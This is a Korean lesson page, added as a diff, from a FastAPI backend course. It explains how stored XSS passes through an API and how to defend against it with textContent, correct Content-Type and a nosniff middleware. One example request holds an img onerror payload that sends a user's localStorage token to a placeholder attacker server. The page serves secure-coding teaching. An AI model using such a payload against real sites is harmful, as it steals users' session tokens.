@@ -1,0 +1,58 @@
+<!doctype html>
+<html lang="ko">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>S9-P31-01 크로스사이트 스크립트와 API | FastAPI로 배우는 REST API 백엔드 개발</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=IBM+Plex+Sans+KR:wght@400;600;700&display=swap">
+<link rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body data-page="S9-P31-01">
+<header class="topbar">
+  <a class="course" href="../../index.html">FastAPI로 배우는 REST API 백엔드 개발</a>
+  <nav class="crumbs" aria-label="현재 위치"><a href="../index.html">S9. 개발 보안 기초와 입력데이터 검증</a><span class="sep">/</span><span>S9-P31 입력데이터 검증 2: XSS, 파일 업로드, 명령어 삽입</span></nav>
+</header>
+<nav class="timebar" aria-label="이 파트의 페이지와 시간">
+  <a href="s9-p31-01.html" style="flex:10" data-type="주요 개념" title="크로스사이트 스크립트와 API (10분)" aria-current="page"><span class="seg-num">01</span><span class="seg-min">10분</span></a><a href="s9-p31-02.html" style="flex:10" data-type="주요 개념" title="위험한 형식 파일 업로드 (10분)"><span class="seg-num">02</span><span class="seg-min">10분</span></a><a href="s9-p31-03.html" style="flex:20" data-type="실습" title="업로드 API 보안 강화 (20분)"><span class="seg-num">03</span><span class="seg-min">20분</span></a><a href="s9-p31-04.html" style="flex:5" data-type="주요 개념" title="명령어 삽입과 SSRF (5분)"><span class="seg-num">04</span><span class="seg-min">5분</span></a><a href="s9-p31-05.html" style="flex:5" data-type="정리" title="정리: 입력데이터 검증 (5분)"><span class="seg-num">05</span><span class="seg-min">5분</span></a>
+</nav>
+<main class="page">
+<div class="page-meta"><span class="type type-concept">주요 개념</span><span>10분</span><span>S9-P31-01</span></div>
+<h1>크로스사이트 스크립트와 API</h1>
+<div class="goal"><p><strong>이 파트의 학습 목표</strong>API 응답과 파일 처리에서 생기는 입력데이터 검증 보안약점을 막을 수 있습니다.</p></div>
+
+<p class="lead">API 서버는 HTML 화면을 만들지 않는데도 크로스사이트 스크립트와 무관하지 않습니다. API가 저장하고 내준 값이 다른 사람의 화면에서 실행되는 경로를 봅니다.</p>
+
+<h2>저장형 XSS가 API를 거쳐 가는 길</h2>
+<p><strong>크로스사이트 스크립트(XSS)</strong>는 공격자가 넣은 스크립트가 다른 사용자의 브라우저에서 실행되는 공격입니다. 데이터베이스에 저장되었다가 나중에 실행되는 것을 저장형 XSS라고 합니다.</p>
+<figure><svg viewBox="0 0 640 120" role="img" aria-label="공격 값은 API를 지나 화면에서 실행됩니다. 실행되는 곳은 API가 아니라 화면입니다." xmlns="http://www.w3.org/2000/svg"><defs><marker id="arr" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0 L10 5 L0 10 z" style="fill:var(--ink-soft)"/></marker></defs><rect x="10" y="30" width="140" height="70" rx="8" class="svg-box"/><text x="80.0" y="61.0" text-anchor="middle" class="svg-text">공격자</text><text x="80.0" y="81.0" text-anchor="middle" class="svg-small">제목에 스크립트</text><rect x="180" y="30" width="130" height="70" rx="8" class="svg-box"/><text x="245.0" y="61.0" text-anchor="middle" class="svg-text">도서 API</text><text x="245.0" y="81.0" text-anchor="middle" class="svg-small">그대로 저장</text><rect x="340" y="30" width="130" height="70" rx="8" class="svg-box-accent"/><text x="405.0" y="61.0" text-anchor="middle" class="svg-text">웹 화면</text><text x="405.0" y="81.0" text-anchor="middle" class="svg-small">innerHTML로 표시</text><rect x="500" y="30" width="130" height="70" rx="8" class="svg-box"/><text x="565.0" y="61.0" text-anchor="middle" class="svg-text">다른 사용자</text><text x="565.0" y="81.0" text-anchor="middle" class="svg-small">브라우저에서 실행</text><line x1="155" y1="65" x2="175" y2="65" class="svg-line" marker-end="url(#arr)"/><line x1="315" y1="65" x2="335" y2="65" class="svg-line" marker-end="url(#arr)"/><line x1="475" y1="65" x2="495" y2="65" class="svg-line" marker-end="url(#arr)"/></svg><figcaption>공격 값은 API를 지나 화면에서 실행됩니다. 실행되는 곳은 API가 아니라 화면입니다.</figcaption></figure>
+<div class="codeblock"><pre><code>POST /books  {"title": "&lt;img src=x onerror=\"fetch('https://공격자서버/?t='+localStorage.token)\"&gt;", ...}</code></pre></div>
+
+<p>이 제목을 웹 화면이 <code>element.innerHTML = book.title</code>로 넣으면, 브라우저는 제목을 HTML로 해석해 <code>onerror</code>의 스크립트를 실행합니다. 화면을 본 사용자의 토큰이 공격자에게 넘어갑니다. 3일차에 토큰을 localStorage에 두면 위험하다고 한 이유입니다(S5-P18-04).</p>
+
+<h2>막는 곳은 출력하는 시점</h2>
+<div class="codeblock"><span class="file">화면 코드(JavaScript)</span><pre><code>element.innerHTML = book.title;   // 위험: HTML로 해석합니다.
+element.textContent = book.title; // 안전: 글자 그대로 보여 줍니다.</code></pre></div>
+
+<p>제목에 <code>&lt;</code>가 들어간 도서도 있을 수 있으므로, API가 입력을 마음대로 지우거나 바꾸지 않습니다. 대신 값을 <strong>출력하는 곳</strong>이 그곳에 맞게 처리합니다. 화면은 글자로 넣고, React 같은 화면 도구는 기본으로 이렇게 처리합니다. 업무상 특수 문자가 필요 없는 필드라면 입력 단계에서 허용 문자를 정해 한 겹 더 막을 수 있습니다.</p>
+
+<h2>API가 지킬 것: Content-Type</h2>
+<div class="table-wrap"><table><thead><tr><th>상황</th><th>위험</th><th>도서 API</th></tr></thead><tbody><tr><td>JSON을 <code>application/json</code>으로 응답</td><td>브라우저가 HTML로 실행하지 않습니다.</td><td>FastAPI의 기본값입니다.</td></tr><tr><td>사용자 값을 넣은 HTML을 응답</td><td>그대로 실행됩니다.</td><td>HTML 응답을 만들지 않습니다.</td></tr><tr><td>사용자가 올린 파일을 내 주소로 내보냄</td><td>HTML이 담긴 파일을 브라우저가 HTML로 짐작해 실행할 수 있습니다.</td><td>다음 페이지에서 막습니다.</td></tr></tbody></table></div>
+
+<p>브라우저는 응답의 Content-Type이 이상해 보이면 내용을 보고 형식을 짐작하는 경우가 있습니다(콘텐츠 스니핑). 응답마다 <code>X-Content-Type-Options: nosniff</code> 헤더를 붙여 짐작하지 말고 Content-Type을 따르라고 지시합니다.</p>
+<div class="codeblock"><span class="file">app/main.py</span><pre><code>@app.middleware("http")
+async def add_security_headers(request: Request, call_next):
+    response = await call_next(request)
+    # 브라우저가 Content-Type을 무시하고 내용을 보고 형식을 짐작하지 못하게 합니다.
+    response.headers["X-Content-Type-Options"] = "nosniff"
+    return response</code></pre></div>
+
+</main>
+<footer class="pager">
+  <a class="prev" href="../../s9/p30/s9-p30-05.html"><span class="dir">이전</span>S9-P30-05 정리: SQL 삽입과 경로 조작</a>
+  <a class="next" href="../../s9/p31/s9-p31-02.html"><span class="dir">다음</span>S9-P31-02 위험한 형식 파일 업로드</a>
+</footer>
+<script src="../../assets/js/main.js"></script>
+</body>
+</html>
